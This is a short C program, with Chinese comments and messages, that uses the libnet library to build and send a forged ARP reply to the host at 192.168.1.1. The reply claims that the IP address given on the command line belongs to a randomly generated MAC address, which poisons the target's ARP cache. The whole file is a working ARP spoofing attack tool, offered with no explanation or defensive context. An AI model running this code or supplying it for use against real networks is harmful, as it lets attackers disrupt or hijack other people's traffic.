#include <libnet.h>

void main(int argc,char *argv[])
{
	if(argc!=2)
	{
		printf("用法错误：需要添加唯一IP参数\n");
		return;
	}

	char error_buf[LIBNET_ERRBUF_SIZE];
	libnet_t *l;
	l= libnet_init(LIBNET_LINK_ADV,NULL,error_buf);
	if(l==NULL) 
	{
		printf("libnet初始化错误:%s\n",error_buf);
		libnet_destroy(l);
		return;
	}
	//--
	srand((unsigned)time(NULL)>>11);	//NULL代表空指针,位移11可以使值2048秒变一次
	u_char sha[6]={rand()%256,rand()%256,rand()%256,rand()%256,rand()%256,rand()%256,};
	//随机产生源以太网址
	u_char dha[6]={0x08,0x10,0x74,0x06,0x36,0xF6};
	char *src_ip=argv[1];
	u_int spa=libnet_name2addr4(l,src_ip,LIBNET_RESOLVE);
	char *dst_ip="192.168.1.1";
	u_int dpa=libnet_name2addr4(l,dst_ip,LIBNET_RESOLVE);
	if(libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REPLY,sha,(u_int8_t *)&spa,dha,(u_int8_t *)&dpa,NULL,0,l,0)==-1)
	{
		printf("构造ARP错误：%s\n",libnet_geterror(l));
		libnet_destroy(l);
		return;
	}
	
	if(libnet_build_ethernet(dha,sha,ETHERTYPE_ARP,NULL,0,l,0)==-1)
	{
		printf("构造以太错误：%s\n",libnet_geterror(l));
		libnet_destroy(l);
		return;
	}
	libnet_diag_dump_pblock(l);
	libnet_diag_dump_context(l);
	libnet_write(l);
	libnet_destroy(l);
	return;
}
